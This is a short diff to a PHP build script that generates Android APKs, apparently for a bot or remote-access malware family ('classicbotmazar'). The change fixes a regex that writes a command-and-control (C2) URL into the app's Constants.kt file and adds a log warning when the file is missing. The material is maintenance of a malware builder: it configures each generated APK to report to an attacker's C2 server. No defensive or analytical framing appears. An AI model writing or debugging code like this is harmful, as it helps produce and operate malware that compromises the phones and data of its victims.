@@ -34,9 +34,12 @@ sendLog("Starting build process for $apkName ($appLabel)...");
 $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
 if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
-    $c = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
+    // Fixed regex to match Kotlin property pattern correctly
+    $c = preg_replace('/val urlConnection\s*=\s*".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
     file_put_contents($constFile, $c);
     sendLog("Updated Constants.kt with C2 URL: $c2Url");
+} else {
+    sendLog("Warning: Constants.kt not found at $constFile");
 }
 
 // Update Strings
